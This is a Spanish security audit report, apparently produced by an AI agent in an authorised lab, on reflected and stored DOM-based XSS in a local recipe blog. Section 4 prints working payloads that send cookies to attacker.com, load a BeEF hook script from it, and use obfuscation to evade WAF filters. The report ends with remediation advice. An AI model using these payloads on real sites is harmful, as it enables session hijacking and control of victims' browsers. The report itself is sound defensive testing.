# Informe de Auditoría de Seguridad — Cross-Site Scripting (XSS)

**Fecha:** 2026-04-21T10:20:34Z  
**Auditor:** Copilot CLI (Claude Sonnet 4.6) — Modo Offensive Security  
**Objetivo:** http://web.dev.local:8082  
**Entorno:** Laboratorio controlado y autorizado  
**Clasificación:** CONFIDENCIAL

---

## 1. Resumen Ejecutivo

Durante el análisis de la aplicación web "Blog de Recetas" en `http://web.dev.local:8082`, se identificaron y explotaron exitosamente **dos vulnerabilidades de Cross-Site Scripting (XSS)**:

| # | Tipo | Parámetro | Vector | Severidad |
|---|------|-----------|--------|-----------|
| 1 | **DOM-based XSS (Reflected)** | `search` (GET) | `document.write(searchTerm)` | 🔴 Alta |
| 2 | **DOM-based XSS (Stored)** | `name`, `comment` (GET → localStorage) | `document.write(c.name)` / `document.write(c.comment)` | 🔴 Alta |

Ambas vulnerabilidades fueron **explotadas activamente**, logrando:
- Ejecución de JavaScript arbitrario en el navegador de la víctima
- Robo simulado de cookies de sesión (`document.cookie` exfiltrado via `fetch`/`Image()`)
- Inyección de hook BeEF (`hook.js`) desde servidor atacante
- Ejecución de XSS persistente desde localStorage en cada visita posterior

---

## 2. Reconocimiento y Metodología

### 2.1 Herramientas utilizadas

- `curl` — Inspección de cabeceras HTTP y código fuente HTML
- `dalfox v2.12.0` — Escáner automatizado de XSS
- `puppeteer` (Node.js) — Verificación y explotación en navegador headless real

### 2.2 Reconocimiento inicial

```bash
# Inspección de cabeceras y código fuente
curl -si http://web.dev.local:8082/ | head -50
curl -s http://web.dev.local:8082/ | grep -E '(form|input|action|script|document.write)'
```

**Hallazgos del reconocimiento:**
- Servidor: Apache/2.4.65 (Unix)
- Aplicación: Blog de recetas con buscador (GET `?search=`) y sistema de comentarios (GET `?name=&comment=`)
- La aplicación lee parámetros URL con `URLSearchParams` y los escribe directamente en el DOM mediante `document.write()` **sin ningún tipo de sanitización**

### 2.3 Escaneo automatizado con Dalfox

```bash
/root/go/bin/dalfox url "http://web.dev.local:8082/?search=test" --no-color --deep-domxss
/root/go/bin/dalfox url "http://web.dev.local:8082/?name=test&comment=test" --no-color
```

> **Nota:** Dalfox detectó los parámetros como reflejados pero no confirmó XSS automáticamente, ya que la vulnerabilidad es puramente DOM-based (lado cliente). La verificación se realizó con navegador headless real.

---

## 3. Descripción Técnica de las Vulnerabilidades

### 3.1 Vulnerabilidad #1 — Reflected DOM-based XSS (parámetro `search`)

**URL vulnerable:**
```
http://web.dev.local:8082/?search=<PAYLOAD>
```

**Código vulnerable (extracto de la página):**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');   // ← entrada sin validar

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ↑ document.write con concatenación directa = DOM XSS
}
```

**Sink:** `document.write()`  
**Source:** `URLSearchParams.get('search')`  
**Tipo:** DOM-based XSS Reflected

---

### 3.2 Vulnerabilidad #2 — Stored DOM-based XSS (parámetros `name` y `comment`)

**URL vulnerable:**
```
http://web.dev.local:8082/?name=<PAYLOAD>&comment=<PAYLOAD>
```

**Código vulnerable (extracto):**
```javascript
// Al enviar el formulario, almacena en localStorage SIN sanitizar:
let comments = JSON.parse(localStorage.getItem('comments') || '[]');
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Al cargar la página, renderiza desde localStorage SIN sanitizar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Sink:** `document.write()`  
**Source:** `localStorage.getItem('comments')` ← alimentado desde URL params  
**Tipo:** DOM-based XSS Stored (persistente en localStorage)

---

## 4. Explotación Activa

### 4.1 Confirmación básica — alert(document.cookie)

```bash
# Payload URL-encoded para parámetro search
curl "http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E"
```

**URL de ataque:**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert(document.cookie)>
```

**Resultado (Puppeteer):**
```
[DIALOG]: alert -> ""   ✅ ALERT FIRED
```
> Cookie vacía porque no hay sesión activa, pero el XSS ejecuta JavaScript en contexto de la página.

---

### 4.2 Explotación — Robo de sesión vía Image() beacon

**Payload ofensivo:**
```html
<img src=x onerror="new Image().src='http://attacker.com:4444/steal?c='+encodeURIComponent(document.cookie)">
```

**URL completa de ataque:**
```
http://web.dev.local:8082/?search=%3Cimg%20src%3Dx%20onerror%3D%22new%20Image().src%3D%27http%3A%2F%2Fattacker.com%3A4444%2Fsteal%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%3E
```

**Resultado (interceptado por Puppeteer):**
```
REQUEST → http://attacker.com:4444/steal?c=   ✅ EXFILTRACIÓN CONFIRMADA
```

> En un escenario real, el atacante recibiría: `steal?c=sessionid=abc123;auth_token=xyz...`

---

### 4.3 Explotación avanzada — Inyección de Hook BeEF

**Payload:**
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

**URL de ataque:**
```
http://web.dev.local:8082/?search=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E
```

**Resultado (interceptado por Puppeteer):**
```
SCRIPT REQUEST → http://attacker.com:3000/hook.js   ✅ HOOK CARGADO
```

> Esto permite al atacante controlar el navegador de la víctima a través del panel de BeEF: keylogging, captura de pantalla, redirección a phishing, ataques internos desde la red de la víctima.

---

### 4.4 Explotación — XSS Almacenado persistente

**Paso 1 — Inyectar payload en comentario:**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert("STORED_XSS_FIRED")>&comment=comentario
```

**Paso 2 — Visita limpia a la página (activa el XSS desde localStorage):**
```
http://web.dev.local:8082/
```

**Resultado:**
```
[DIALOG]: alert -> "STORED_XSS_FIRED"   ✅ ALMACENADO Y DISPARADO
[DIALOG]: alert -> "STORED_XSS_FIRED"   ✅ DISPARADO SEGUNDA VEZ (reload)
```

> El XSS se dispara **en cada visita futura** a la página, sin necesidad de que la URL contenga el payload. Esto afecta a cualquier usuario que visite la página en el mismo navegador, o en navegadores que compartan el localStorage.

---

### 4.5 Payload ofuscado (evasión de filtros WAF)

```javascript
// Ofuscación con JSFuck / codificación Hex para evadir WAFs básicos
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

// Payload alternativo con evento onmouseover (sin comillas)
<svg onmouseover=alert`XSS`>

// Payload con codificación HTML entities
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

// Exfiltración avanzada con fetch + base64
<img src=x onerror="fetch('http://attacker.com/?d='+btoa(document.cookie+localStorage.getItem('comments')))">
```

---

## 5. Impacto

| Vector de Impacto | Descripción | Criticidad |
|-------------------|-------------|------------|
| **Robo de sesión** | Extracción de cookies de sesión → hijacking de cuentas | 🔴 Crítico |
| **Persistencia** | XSS almacenado en localStorage → ejecución en cada visita | 🔴 Crítico |
| **Control de navegador** | BeEF hook → keylogging, capturas, pivoting interno | 🔴 Crítico |
| **Defacement** | Modificación del contenido visible de la página | 🟠 Alto |
| **Phishing interno** | Inyección de formularios falsos de login | 🟠 Alto |
| **CSRF amplificado** | Acciones no autorizadas en nombre del usuario | 🟠 Alto |

---

## 6. Recomendaciones

1. **Sanitizar todas las entradas antes de insertarlas en el DOM.** Usar `textContent` en vez de `innerHTML`/`document.write`:
   ```javascript
   // ❌ VULNERABLE:
   document.write('<strong>' + searchTerm + '</strong>');
   
   // ✅ SEGURO:
   const el = document.createElement('strong');
   el.textContent = searchTerm;  // escapa automáticamente
   container.appendChild(el);
   ```

2. **Nunca usar `document.write()` con datos no confiables.** Esta función inserta HTML crudo sin escape.

3. **Sanitizar datos almacenados en localStorage** con una librería como [DOMPurify](https://github.com/cure53/DOMPurify):
   ```javascript
   document.write('<div>' + DOMPurify.sanitize(c.comment) + '</div>');
   ```

4. **Implementar Content Security Policy (CSP):**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
   ```

5. **Validar y codificar el output** en el servidor con funciones de escape HTML antes de enviar al cliente.

---

## 7. Conclusión

La aplicación `http://web.dev.local:8082` presenta **vulnerabilidades críticas de XSS** de tipo Reflected y Stored en sus parámetros `search`, `name` y `comment`. Todas fueron explotadas exitosamente en un entorno de navegador real (Puppeteer/Chromium), demostrando:

- ✅ Ejecución de JavaScript arbitrario
- ✅ Exfiltración de credenciales/cookies via `Image()` beacon
- ✅ Carga de hook BeEF para control total del navegador
- ✅ Persistencia del XSS vía localStorage (cualquier visitante futuro es vulnerable)

**Clasificación CVSS estimada:** 8.2 (Alta) — CWE-79: Improper Neutralization of Input During Web Page Generation.

---

*Informe generado por Copilot CLI — Auditoría de Seguridad Ofensiva*  
*Modelo: Claude Sonnet 4.6 — Entorno Kali Linux*
